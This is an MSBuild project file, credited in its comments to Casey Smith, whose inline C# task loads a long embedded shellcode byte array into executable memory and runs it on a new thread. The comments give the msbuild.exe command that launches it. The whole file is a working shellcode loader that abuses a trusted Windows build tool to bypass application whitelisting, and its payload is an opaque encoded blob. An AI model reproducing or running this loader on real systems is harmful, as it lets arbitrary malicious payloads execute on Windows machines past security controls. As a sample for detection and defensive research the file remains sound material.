<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
         <!-- This inline task executes shellcode. -->
         <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
         <!-- Save This File And Execute The Above Command -->
         <!-- Author: Casey Smith, Twitter: @subTee -->
         <!-- License: BSD 3-Clause -->
	  <Target Name="Hello">
	    <ClassExample />
	  </Target>
	  <UsingTask
	    TaskName="ClassExample"
	    TaskFactory="CodeTaskFactory"
	    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	    <Task>
	    
	      <Code Type="Class" Language="cs">
	      <![CDATA[
		using System;
		using System.Runtime.InteropServices;
		using Microsoft.Build.Framework;
		using Microsoft.Build.Utilities;
		public class ClassExample :  Task, ITask
		{         
		  private static UInt32 MEM_COMMIT = 0x1000;          
		  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
		  [DllImport("kernel32")]
		    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
		    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
		  [DllImport("kernel32")]
		    private static extern IntPtr CreateThread(            
		    UInt32 lpThreadAttributes,
		    UInt32 dwStackSize,
		    UInt32 lpStartAddress,
		    IntPtr param,
		    UInt32 dwCreationFlags,
		    ref UInt32 lpThreadId           
		    );
		  [DllImport("kernel32")]
		    private static extern UInt32 WaitForSingleObject(           
		    IntPtr hHandle,
		    UInt32 dwMilliseconds
		    );          
		  public override bool Execute()
		  {
			//replace with your own shellcode
		    byte[] shellcode = new byte[] { 0xba,0xc0,0xe2,0x77,0x64,0xda,0xc0,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0x66,0xb9,0x02,0x01,0x83,0xc6,0x04,0x31,0x56,0x10,0x03,0x96,0xf2,0x95,0x91,0xac,0x20,0x33,0xa8,0x24,0x1c,0x0c,0x95,0xb0,0x85,0x79,0x7d,0x11,0x0f,0x30,0x79,0xe2,0x4c,0x37,0x4f,0xb7,0x5d,0x3b,0xfc,0xeb,0xea,0x3c,0x2f,0x1c,0x1a,0x03,0x4f,0x0a,0x3d,0xcf,0x86,0xd8,0xbf,0xe3,0x59,0xcf,0xe4,0x33,0x4e,0x24,0x9f,0x8e,0x51,0xa8,0x95,0xba,0xee,0xa3,0xb7,0xba,0xc4,0xe8,0xe9,0x8e,0xf5,0x31,0x8c,0x84,0x2f,0x1e,0xa7,0xe4,0xb3,0x36,0xa3,0x05,0x18,0xf6,0x89,0x69,0x9c,0xb7,0x12,0xf4,0xa4,0x94,0xc9,0x2e,0xf3,0x93,0x8b,0x54,0xf9,0x2d,0xfb,0xad,0x35,0x19,0x82,0xb1,0xf0,0x13,0x94,0xdf,0x00,0x52,0x1d,0x34,0x42,0xfc,0xa1,0xf4,0x6f,0x89,0x90,0x42,0x7b,0xdd,0xb6,0x6f,0x64,0x0d,0xab,0x84,0xa4,0xc0,0x54,0xee,0xa5,0xe2,0xa6,0xd7,0xfe,0x6a,0x9e,0x6b,0x93,0xcf,0xbd,0x43,0x48,0x37,0xfd,0x9c,0x39,0x3f,0xe8,0xe4,0x6e,0xa3,0x41,0x09,0xcf,0x05,0x50,0x4a,0x12,0xef,0xfd,0x08,0x30,0x0b,0x03,0x50,0x9e,0xab,0xba,0xba,0x83,0x87,0x42,0xb5,0x98,0x16,0x7d,0xc5,0x38,0x42,0x15,0xb8,0x93,0x9a,0xf3,0xa3,0xfe,0xae,0x10,0x1a,0x42,0xfc,0xc2,0xdc,0xe3,0xf1,0x9a,0x13,0xf0,0x79,0x42,0xbb,0x1a,0x11,0x0a,0x14,0x02,0xf5,0x8c,0x1e,0xc2,0x4e,0xab,0x5f,0x2f,0xa5,0x48,0xb4,0x34,0x7d,0x1d,0x07,0x31,0x06,0x3b,0x44,0xf2,0xaa,0x10,0x6c,0x6d,0x54,0xf0,0x1b,0x4a,0xfb,0x8e,0xb3,0x02,0x3e,0x53,0x95,0x98,0xd2,0x00,0x67,0x4b,0x03,0x3f,0x30,0x3c,0x89,0xf0,0xc6,0x4c,0x48,0xd5,0xed,0x85,0xe7,0x02,0xce,0x4b,0x13,0x90,0xfa,0x44,0xa9,0x2d,0xf3,0x59,0x46,0x27,0xb7,0x5c,0xa8,0x0b,0x0b,0x2a,0x1e,0xea,0x3d,0xbe,0x36,0xc5,0x96,0xa4,0xb8,0x29,0x4b,0xc4,0xfe,0x33,0xa7,0x56,0xc7,0xf5,0x97,0xf0,0x73,0x07,0x5c,0x67,0xc4,0x60,0xcb,0x84,0x43,0x35,0xf4,0x37,0xf5,0x01,0x93,0x7d,0x17,0x4b,0xca,0x02,0xb9,0x5f,0xa6,0x30,0xdc,0x22,0xee,0x2d,0x2d,0xa4,0xca,0x6f,0x1d,0x81,0x4a,0x14,0x00,0x53,0x09,0x3d,0xd8,0xa7,0x3d,0xbb,0x65,0x99,0xb8,0x8e,0xba,0x09,0x57,0xe8,0x8a,0xd6,0x53,0x84,0x71,0x59,0xed,0x00,0x8d,0x0e,0xd3,0xd1,0x36,0x82,0x9e,0x7c,0x1a,0x2e,0x29,0x04,0xf7,0xb0,0x6a,0x60,0x82,0x03,0x35,0x85,0x37,0xd9,0xec,0xa0,0x56,0x32,0xb0,0xf1,0x70,0x45,0x82,0xc2,0xbc,0x75,0xa1,0x6d,0x43,0x72,0x8b,0x65,0x99,0x43,0x6f,0xdf,0x84,0xdf,0xb4,0xbd,0xd1,0xb6,0xf6,0x9c,0x61,0xf3,0xfa,0x09,0x8a,0x64,0xa1,0x2a,0xcb,0x79,0x73,0xce,0x1a,0xad,0x9e,0x44,0xf1,0xfb,0x19,0xe3,0x11,0xcb,0xe9,0x8c,0x5d,0xdb,0xe3,0xb8,0x7a,0x1f,0x2e,0xc4,0xbb,0xbf,0x85,0xea,0xbb,0xfd,0xda,0x37,0x43,0x96,0xc5,0xe6,0xc6,0xaf,0x30,0x32,0x97,0xc6,0xc1,0x51,0x18,0x95,0xb1,0x2a,0x48,0xcf,0xff,0x61,0xf3,0x08,0xce,0x68,0x48,0xca,0x0d,0xf1,0x27,0x55,0x9e,0x2e,0xbf,0x02,0x56,0xc1,0xc5,0xbf,0xfc,0xd1,0x12,0x33,0x87,0x72,0x86,0x6c,0xc1,0x4e,0xe3,0x3c,0xe4,0x6e,0xc1,0x84,0x13,0x2e,0x44,0x26,0xb5,0xa9,0x7f,0x75,0x5f,0x4a,0x0d,0x1d,0xf7,0x20,0x32,0xb0,0xa7,0x83,0xab,0xbf,0xfb,0x99,0xd6,0xa0,0xb7,0xc7,0x10,0x6c,0xaf,0x9a,0x70,0x49,0x72,0xe1,0x42,0x1c,0x3a,0xcc,0x7f,0x89,0x3a,0xf5,0xdd,0x30,0x03,0xbe,0xd8,0xf6,0x57,0x78,0xcc,0xbd,0xc5,0xc3,0xc9,0xea,0xf3,0x79,0xdd,0x2a,0x1b,0xa8,0x91,0x56,0x8e,0x55,0xc3,0xb6,0x98,0x27,0x9f,0x25,0x93,0x40,0xc7,0x0e,0xd3,0x89,0x41,0x89,0x5b,0xa0,0x21,0x8a,0x85,0x4e,0x6d,0x77,0x78,0x5c,0xe4,0xa6,0x05,0x6f,0x79,0x6b,0x99,0xcf,0x17,0xb4,0x48,0xd0,0xc7,0xd8,0x67,0xc8,0xff,0x0d,0x37,0xef,0x85,0xf2,0x65,0xdb,0x7d,0xc4,0xc5,0x15,0x62,0x09,0xb3,0x53,0xeb,0x9e,0xe6,0x8e,0x84,0x5f,0x7f,0x68,0x9f,0x70,0xca,0x9f,0xda,0x43,0x94,0xb6,0x5c,0xac,0xd6,0x00,0x77,0xca,0xa3,0x99,0x90,0xb6,0x19,0xd8,0xeb,0xcb,0x38,0x1e,0xb7,0x81,0x55,0x9e,0x0c,0x13,0x7d,0x69,0xde,0xdf,0xa1,0x33,0x10,0x86,0xd9,0xe7,0xd6,0x45,0x50,0x44,0xfd,0x95,0xf2,0x42,0x59,0x34,0xe0,0x88,0x62,0x1a,0x2a,0x59,0x83,0x1e,0x8e,0x60,0xdf,0xe1,0xe8,0x5c,0xe3,0xa8,0x75,0xa9,0x26,0xce,0x74,0x30,0xa4,0x38,0x2c,0x64,0xa5,0x52,0x62,0xe9,0x83,0xe8,0x31,0xa5,0x46,0x88,0x94,0x4e,0xf8,0x42,0x34,0xa3,0x77,0x3c,0x5c,0x02,0xb7,0x11,0xf6,0x03,0x1d,0x06,0x10,0xec,0xaa,0x16,0x30,0xb5,0x5c,0x57,0xe5,0x89,0x6b,0xd2,0xe8,0x41,0x21,0x70,0x8f,0x96,0x97,0x52,0xb8,0x75,0xaa,0xba,0xc0,0x3f,0x44,0xc8,0xe0,0x02,0xc7,0x3f,0x03,0x76,0x58,0x47,0xbc,0x43,0x62,0x7e,0x04,0x23,0x6c,0x3c,0xa8,0xff,0xea,0x69,0x80,0xbf,0x99,0x77,0x6c,0xfc,0xc8,0x69,0xaa,0x0d,0xab,0xe5,0x28,0x51,0xe6,0x59,0x71,0xd8,0xc4,0x44,0xbe,0x1d,0x26,0x5a,0x51,0x18,0x5b,0xfd,0xfd,0x81,0xca,0xac,0x41,0x39,0x32,0x0d,0xe4,0x94,0xa7,0x50,0x6a,0xf5,0x8d,0xeb,0x10,0xa8,0x39,0xb5,0xfc,0x3b,0xa0,0xae,0xd3,0x48,0x4a,0x2c,0x41,0x15,0xea,0x0b,0x65,0x27,0xf7,0x44,0x09,0xff,0x69,0xd6,0x5b,0x5b,0x48,0x2d,0x8e,0x7f,0xfa,0x05,0xcf,0x3c,0xc6,0x19,0xd1,0x4e,0x31,0x87,0xf1,0x31,0x7c,0xc2,0x14,0xea,0xd1,0x5d,0x8c,0xc8,0x6a,0x51,0x83,0x4a,0x50,0x45,0x19,0x95,0x6c,0x4c,0x95,0x68,0x12,0x43,0x5f,0x5d,0xd9,0x3b,0xc2,0x75,0x01,0x25,0x08,0xb4,0x32,0x3c,0x65,0xef,0xa5,0xf6,0x12,0x70,0x0b,0x26,0x3e,0xa0,0xe5,0xb2,0x3e,0xe0,0xb4,0x47,0x90,0xdd,0x8b,0x24,0xe8,0xf5,0x62,0xef,0x5e,0xae,0x93,0x88,0xcd,0x6f,0x19,0xe7,0xe1,0xf8,0xc9,0x5a,0xfd,0xe5,0xa5,0xab,0xa4,0xde,0x8e,0xd3,0xc4,0x3f,0xee,0xe1,0x49,0x99,0x9e,0x22,0x81,0x61,0x22,0xca,0x47,0x8f,0xb2,0xfc,0x4f,0x40,0x94,0x2b,0xff,0x93,0xb8,0x1f,0xb9,0xee,0xf0,0xbc,0x16,0x9a,0x31,0xfd,0x23,0xac,0xe6,0x68,0x60,0x3c,0x22,0x04,0x3e,0x3c,0x1a,0xf2,0x50,0x3e,0x65,0xa3,0xb3,0xf8,0xde,0x8b,0xf1,0x03,0x25,0x96,0x31,0x6c,0x11,0x31,0x52,0xb6,0x74,0xae,0x90,0x2b,0x54,0x45,0x44,0xc4,0x30,0xc4,0x66,0x8e,0x40,0xaa,0x73,0x8c,0x44,0x0b,0xd1,0x88,0x65,0x98,0x6b,0xc6 };
			UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
			MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		      Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
		      IntPtr hThread = IntPtr.Zero;
		      UInt32 threadId = 0;
		      IntPtr pinfo = IntPtr.Zero;
		      hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
		      WaitForSingleObject(hThread, 0xFFFFFFFF);
		      return true;
		  } 
		}     
	      ]]>
	      </Code>
	    </Task>
	  </UsingTask>
	</Project>